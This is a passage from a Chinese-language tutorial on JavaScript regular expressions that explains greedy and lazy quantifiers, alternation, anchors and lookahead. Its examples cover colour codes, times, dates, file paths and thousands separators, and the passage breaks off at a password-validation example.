class="token operator">=</span> <span class="token string">"123 1234 12345 123456"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["123", "1234", "12345", "12345"]</span>复制代码</code></pre><p>其中正则<code>/\d{2,5}/</code>，表示数字连续出现2到5次。会匹配2位、3位、4位、5位连续数字。</p><p>但是其是贪婪的，它会尽可能多的匹配。你能给我6个，我就要5个。你能给我3个，我就3要个。反正只要在能力范围内，越多越好。</p><p>我们知道有时贪婪不是一件好事（请看文章最后一个例子）。而惰性匹配，就是尽可能少的匹配：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d{2,5}?/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"123 1234 12345 123456"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["12", "12", "34", "12", "34", "12", "34", "56"]</span>复制代码</code></pre><p>其中<code>/\d{2,5}?/</code>表示，虽然2到5次都行，当2个就够的时候，就不在往下尝试了。</p><p>通过在量词后面加个问号就能实现惰性匹配，因此所有惰性匹配情形如下：</p><blockquote><p><code>**{m,n}?**</code><br><code>**{m,}?**</code><br><code>**??**</code><br><code>**+?**</code><br><code>***?**</code></p></blockquote><p>对惰性匹配的记忆方式是：量词后面加个问号，问一问你知足了吗，你很贪婪吗？</p><h3 id="4-多选分支"><a href="#4-多选分支" class="headerlink" title="4. 多选分支"></a>4. 多选分支</h3><p>一个模式可以实现横向和纵向模糊匹配。而多选分支可以支持多个子模式任选其一。</p><p>具体形式如下：<code>(p1|p2|p3)</code>，其中<code>p1</code>、<code>p2</code>和<code>p3</code>是子模式，用<code>|</code>（管道符）分隔，表示其中任何之一。</p><p>例如要匹配”good”和”nice”可以使用<code>/good|nice/</code>。测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/good|nice/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"good idea, nice try."</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["good", "nice"]</span>复制代码</code></pre><p>但有个事实我们应该注意，比如我用<code>/good|goodbye/</code>，去匹配”goodbye”字符串时，结果是”good”：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/good|goodbye/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"goodbye"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["good"]</span>复制代码</code></pre><p>而把正则改成<code>/goodbye|good/</code>，结果是：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/goodbye|good/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"goodbye"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["goodbye"]</span>复制代码</code></pre><p>也就是说，分支结构也是惰性的，即当前面的匹配上了，后面的就不再尝试了。</p><h3 id="5-案例分析"><a href="#5-案例分析" class="headerlink" title="5. 案例分析"></a>5. 案例分析</h3><p>匹配字符，无非就是字符组、量词和分支结构的组合使用罢了。</p><p>下面找几个例子演练一下（其中，每个正则并不是只有唯一写法）：</p><p><strong>5.1 匹配16进制颜色值</strong></p><p>要求匹配：</p><blockquote><p>#ffbbad</p><p>#Fc01DF</p><p>#FFF</p><p>#ffE</p></blockquote><p>分析：</p><p>表示一个16进制字符，可以用字符组<code>[0-9a-fA-F]</code>。</p><p>其中字符可以出现3或6次，需要是用量词和分支结构。</p><p>使用分支结构时，需要注意顺序。</p><p>正则如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/#([0-9a-fA-F]{6}|[0-9a-fA-F]{3})/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"#ffbbad #Fc01DF #FFF #ffE"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["#ffbbad", "#Fc01DF", "#FFF", "#ffE"]</span>复制代码</code></pre><p><strong>5.2 匹配时间</strong></p><p>以24小时制为例。</p><p>要求匹配：</p><blockquote><p>23:59</p><p>02:07</p></blockquote><p>分析：</p><p>共4位数字，第一位数字可以为<code>[0-2]</code>。</p><p>当第1位为2时，第2位可以为<code>[0-3]</code>，其他情况时，第2位为<code>[0-9]</code>。</p><p>第3位数字为<code>[0-5]</code>，第4位为<code>[0-9]</code></p><p>正则如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^([01][0-9]|[2][0-3]):[0-5][0-9]$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"23:59"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"02:07"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true复制代码</span></code></pre><p>如果也要求匹配7:9，也就是说时分前面的0可以省略。</p><p>此时正则变成：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^(0?[0-9]|1[0-9]|[2][0-3]):(0?[0-9]|[1-5][0-9])$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"23:59"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"02:07"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"7:9"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true复制代码</span></code></pre><p><strong>5.3 匹配日期</strong></p><p>比如yyyy-mm-dd格式为例。</p><p>要求匹配：</p><blockquote><p>2017-06-10</p></blockquote><p>分析：</p><p>年，四位数字即可，可用<code>[0-9]{4}</code>。</p><p>月，共12个月，分两种情况01、02、……、09和10、11、12，可用<code>(0[1-9]|1[0-2])</code>。</p><p>日，最大31天，可用<code>(0[1-9]|[12][0-9]|3[01])</code>。</p><p>正则如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^[0-9]{4}-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"2017-06-10"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p><strong>5.4 window操作系统文件路径</strong></p><p>要求匹配：</p><blockquote><p>F:\study\javascript\regex\regular expression.pdf</p><p>F:\study\javascript\regex\</p><p>F:\study\javascript</p><p>F:\</p></blockquote><p>分析：</p><p>整体模式是: 盘符:\文件夹\文件夹\文件夹\</p><p>其中匹配F:\，需要使用<code>[a-zA-Z]:\\</code>，其中盘符不区分大小写，注意<code>\</code>字符需要转义。</p><p>文件名或者文件夹名，不能包含一些特殊字符，此时我们需要排除字符组<code>[^\\:*&lt;&gt;|&quot;?\r\n/]</code>来表示合法字符。另外不能为空名，至少有一个字符，也就是要使用量词<code>+</code>。因此匹配“文件夹\”，可用<code>[^\\:*&lt;&gt;|&quot;?\r\n/]+\\</code>。</p><p>另外“文件夹\”，可以出现任意次。也就是<code>([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)*</code>。其中括号提供子表达式。</p><p>路径的最后一部分可以是“文件夹”，没有<code>\</code>，因此需要添加<code>([^\\:*&lt;&gt;|&quot;?\r\n/]+)?</code>。</p><p>最后拼接成了一个看起来比较复杂的正则：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/^[a-zA-Z]:\\([^\\:*&lt;>|"?\r\n/]+\\)*([^\\:*&lt;>|"?\r\n/]+)?$/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"F:\\study\\javascript\\regex\\regular expression.pdf"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"F:\\study\\javascript\\regex\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"F:\\study\\javascript"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"F:\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true</span><span class="token comment" spellcheck="true">// => true复制代码</span></code></pre><p>其中，JS中字符串表示<code>\</code>时，也要转义。</p><p><strong>5.5 匹配id</strong></p><p>要求从</p><blockquote><div id="container" class="main"></div></blockquote><p>提取出id=”container”。</p><p>可能最开始想到的正则是：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/id=".*"/</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="main">&lt;/div>'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => id="container" class="main"</span>复制代码</code></pre><p>因为<code>.</code>是通配符，本身就匹配双引号的，而量词<code>*</code>又是贪婪的，当遇到container后面双引号时，不会停下来，会继续匹配，直到遇到最后一个双引号为止。</p><p>解决之道，可以使用惰性匹配：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/id=".*?"/</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="main">&lt;/div>'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => id="container"</span>复制代码</code></pre><p>当然，这样也会有个问题。效率比较低，因为其匹配原理会涉及到“回溯”这个概念（这里也只是顺便提一下，第四章会详细说明）。可以优化如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/id="[^"]*"/</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="main">&lt;/div>'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => id="container"复制代码</span></code></pre><h3 id="第1章-小结"><a href="#第1章-小结" class="headerlink" title="第1章 小结"></a>第1章 小结</h3><p>字符匹配相关的案例，挺多的，不一而足。</p><p>掌握字符组和量词就能解决大部分常见的情形，也就是说，当你会了这二者，JS正则算是入门了。</p><h2 id="第二章-正则表达式位置匹配攻略"><a href="#第二章-正则表达式位置匹配攻略" class="headerlink" title="第二章 正则表达式位置匹配攻略"></a>第二章 正则表达式位置匹配攻略</h2><p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。请记住这句话。</p><p>然而大部分人学习正则时，对于匹配位置的重视程度没有那么高。</p><p>本章讲讲正则匹配位置的总总。</p><p>内容包括：</p><ol><li>什么是位置？</li><li>如何匹配位置？</li><li>位置的特性</li><li>几个应用实例分析</li></ol><h3 id="1-什么是位置呢？"><a href="#1-什么是位置呢？" class="headerlink" title="1. 什么是位置呢？"></a>1. 什么是位置呢？</h3><p>位置是相邻字符之间的位置。比如，下图中箭头所指的地方：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/95d0faf6b21f9414d24c8281b3046746?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="2-如何匹配位置呢？"><a href="#2-如何匹配位置呢？" class="headerlink" title="2. 如何匹配位置呢？"></a>2. 如何匹配位置呢？</h3><p>在ES5中，共有6个锚字符：</p><blockquote><p><code>**^**</code> <code>**$**</code> <code>**\b**</code> <code>**\B**</code> <code>**(?=p)**</code> <code>**(?!p)**</code></p></blockquote><p><strong>2.1 ^和$</strong></p><p><code>^</code>（脱字符）匹配开头，在多行匹配中匹配行开头。</p><p><code>$</code>（美元符号）匹配结尾，在多行匹配中匹配行结尾。</p><p>比如我们把字符串的开头和结尾用”#”替换（位置可以替换成字符的！）：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/^|$/g</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "#hello#"</span>复制代码</code></pre><p>多行匹配模式时，二者是行的概念，这个需要我们的注意：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"I\nlove\njavascript"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/^|$/gm</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*#I##love##javascript#*/</span>复制代码</code></pre><p><strong>2.2 \b和\B</strong></p><p><code>\b</code>是单词边界，具体就是<code>\w</code>和<code>\W</code>之间的位置，也包括<code>\w</code>和<code>^</code>之间的位置，也包括<code>\w</code>和<code>$</code>之间的位置。</p><p>比如一个文件名是”[JS] Lesson_01.mp4”中的<code>\b</code>，如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"[JS] Lesson_01.mp4"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\b/g</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "[#JS#] #Lesson_01#.#mp4#"</span>复制代码</code></pre><p>为什么是这样呢？这需要仔细看看。</p><p>首先，我们知道，<code>\w</code>是字符组<code>[0-9a-zA-Z_]</code>的简写形式，即<code>\w</code>是字母数字或者下划线的中任何一个字符。而<code>\W</code>是排除字符组<code>[^0-9a-zA-Z_]</code>的简写形式，即<code>\W</code>是<code>\w</code>以外的任何一个字符。</p><p>此时我们可以看看”[#JS#] #Lesson_01#.#mp4#”中的每一个”#”，是怎么来的。</p><ul><li>第一个”#”，两边是”[“与”J”，是<code>\W</code>和<code>\w</code>之间的位置。</li><li>第二个”#”，两边是”S”与”]”，也就是<code>\w</code>和<code>\W</code>之间的位置。</li><li>第三个”#”，两边是空格与”L”，也就是<code>\W</code>和<code>\w</code>之间的位置。</li><li>第四个”#”，两边是”1”与”.”，也就是<code>\w</code>和<code>\W</code>之间的位置。</li><li>第五个”#”，两边是”.”与”m”，也就是<code>\W</code>和<code>\w</code>之间的位置。</li><li>第六个”#”，其对应的位置是结尾，但其前面的字符”4”是<code>\w</code>，即<code>\w</code>和<code>$</code>之间的位置。</li></ul><p>知道了<code>\b</code>的概念后，那么<code>\B</code>也就相对好理解了。</p><p><code>\B</code>就是<code>\b</code>的反面的意思，非单词边界。例如在字符串中所有位置中，扣掉<code>\b</code>，剩下的都是<code>\B</code>的。</p><p>具体说来就是<code>\w</code>与<code>\w</code>、<code>\W</code>与<code>\W</code>、<code>^</code>与<code>\W</code>，<code>\W</code>与<code>$</code>之间的位置。</p><p>比如上面的例子，把所有<code>\B</code>替换成”#”：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"[JS] Lesson_01.mp4"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\B/g</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "#[J#S]# L#e#s#s#o#n#_#0#1.m#p#4"</span>复制代码</code></pre><p><strong>2.3 (?=p)和(?!p)</strong></p><p><code>(?=p)</code>，其中<code>p</code>是一个子模式，即<code>p</code>前面的位置。</p><p>比如<code>(?=l)</code>，表示’l’字符前面的位置，例如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(?=l)/g</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "he#l#lo"</span>复制代码</code></pre><p>而<code>(?!p)</code>就是<code>(?=p)</code>的反面意思，比如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(?!l)/g</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "#h#ell#o#"</span>复制代码</code></pre><p>二者的学名分别是positive lookahead和negative lookahead。</p><p>中文翻译分别是正向先行断言和负向先行断言。</p><p>ES6中，还支持positive lookbehind和negative lookbehind。</p><p>具体是<code>(?&lt;=p)</code>和<code>(?&lt;!p)</code>。</p><p>也有书上把这四个东西，翻译成环视，即看看右边或看看左边。</p><p>但一般书上，没有很好强调这四者是个位置。</p><p>比如<code>(?=p)</code>，一般都理解成：要求接下来的字符与<code>p</code>匹配，但不能包括<code>p</code>的那些字符。</p><p>而在本人看来<code>(?=p)</code>就与<code>^</code>一样好理解，就是<code>p</code>前面的那个位置。</p><h3 id="3-位置的特性"><a href="#3-位置的特性" class="headerlink" title="3. 位置的特性"></a>3. 位置的特性</h3><p>对于位置的理解，我们可以理解成空字符””。</p><p>比如”hello”字符串等价于如下的形式：</p><pre class=" language-js"><code class="language-js"><span class="token string">"hello"</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">+</span> <span class="token string">"h"</span> <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> <span class="token string">"e"</span> <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> <span class="token string">"l"</span> <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> <span class="token string">"l"</span> <span class="token operator">+</span> <span class="token string">"o"</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>复制代码</code></pre><p>也等价于：</p><pre class=" language-js"><code class="language-js"><span class="token string">"hello"</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> <span class="token string">"hello"</span>复制代码</code></pre><p>因此，把<code>/^hello$/</code>写成<code>/^^hello$$$/</code>，是没有任何问题的：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token regex">/^^hello$$$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p>甚至可以写成更复杂的:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token regex">/(?=he)^^he(?=\w)llo$\b\b$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p>也就是说字符之间的位置，可以写成多个。</p><p>把位置理解空字符，是对位置非常有效的理解方式。</p><h3 id="4-相关案例"><a href="#4-相关案例" class="headerlink" title="4. 相关案例"></a>4. 相关案例</h3><p><strong>4.1 不匹配任何东西的正则</strong></p><p>让你写个正则不匹配任何东西</p><p>easy，<code>/.^/</code></p><p>因为此正则要求只有一个字符，但该字符后面是开头。</p><p><strong>4.2 数字的千位分隔符表示法</strong></p><p>比如把”12345678”，变成”12,345,678”。</p><p>可见是需要把相应的位置替换成”,”。</p><p>思路是什么呢？</p><p><strong>4.2.1 弄出最后一个逗号</strong></p><p>使用<code>(?=\d{3}$)</code>就可以做到：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"12345678"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(?=\d{3}$)/g</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "12345,678"</span>复制代码</code></pre><p><strong>4.2.2 弄出所有的逗号</strong></p><p>因为逗号出现的位置，要求后面3个数字一组，也就是<code>\d{3}</code>至少出现一次。</p><p>此时可以使用量词<code>+</code>：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"12345678"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(?=(\d{3})+$)/g</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "12,345,678"</span>复制代码</code></pre><p><strong>4.2.3 匹配其余案例</strong></p><p>写完正则后，要多验证几个案例，此时我们会发现问题：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token string">"123456789"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(?=(\d{3})+$)/g</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ",123,456,789"</span>复制代码</code></pre><p>因为上面的正则，仅仅表示把从结尾向前数，一但是3的倍数，就把其前面的位置替换成逗号。因此才会出现这个问题。</p><p>怎么解决呢？我们要求匹配的到这个位置不能是开头。</p><p>我们知道匹配开头可以使用<code>^</code>，但要求这个位置不是开头怎么办？</p><p>easy，<code>(?!^)</code>，你想到了吗？测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string1 <span class="token operator">=</span> <span class="token string">"12345678"</span><span class="token punctuation">,</span>string2 <span class="token operator">=</span> <span class="token string">"123456789"</span><span class="token punctuation">;</span>reg <span class="token operator">=</span> <span class="token regex">/(?!^)(?=(\d{3})+$)/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> string1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "12,345,678"</span>result <span class="token operator">=</span> string2<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "123,456,789"</span>复制代码</code></pre><p><strong>4.2.4 支持其他形式</strong></p><p>如果要把”12345678 123456789”替换成”12,345,678 123,456,789”。</p><p>此时我们需要修改正则，把里面的开头<code>^</code>和结尾<code>$</code>，替换成<code>\b</code>：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"12345678 123456789"</span><span class="token punctuation">,</span>reg <span class="token operator">=</span> <span class="token regex">/(?!\b)(?=(\d{3})+\b)/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "12,345,678 123,456,789"</span>复制代码</code></pre><p>其中<code>(?!\b)</code>怎么理解呢？</p><p>要求当前是一个位置，但不是<code>\b</code>前面的位置，其实<code>(?!\b)</code>说的就是<code>\B</code>。</p><p>因此最终正则变成了：<code>/\B(?=(\d{3})+\b)/g</code>。</p><p><strong>4.3 验证密码问题</strong></p><p>密码长度6-12位，由数字、小写字符和大写字母组成，但必须至少包括2种字符。</p><p>此题，如果写成多个正则来判断，比较容易。但要写成一个正则就比较困难。</p><p>那么，我们就来挑战一下。看看我们对位置的理解是否深刻。</p><p><strong>4.3.1 